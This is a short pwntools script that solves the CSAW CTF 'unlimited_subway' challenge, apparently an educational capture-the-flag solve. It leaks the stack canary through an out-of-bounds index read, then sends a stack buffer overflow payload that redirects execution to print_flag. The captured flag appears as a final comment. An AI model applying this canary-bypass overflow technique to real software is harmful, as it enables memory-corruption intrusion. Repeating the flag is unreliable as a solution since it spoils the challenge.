```python
from pwn import *

# p = process('./unlimited_subway')
p = remote('pwn.csaw.io', 7900)
exe = ELF('./unlimited_subway')

# gdb.attach(p, gdbscript = '''
# b*main+505
# c
# ''')

# input()

canary = b''
for i in range(0, 4):
    p.sendlineafter(b'> ', b'V')
    p.sendlineafter(b'Index : ', str(131 - i))
    p.recvuntil(b' : ')
    canary += p.recv(2)
canary = int(canary, 16)
print(hex(canary))

p.sendlineafter(b'> ', b'E')
p.sendlineafter(b'Size : ', b'128')
payload = b'a'*64 + p32(canary) + b'a' * 4 + p32(exe.sym['print_flag'])
p.sendafter(b'Name : ', payload)


p.interactive()

# csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3}
```
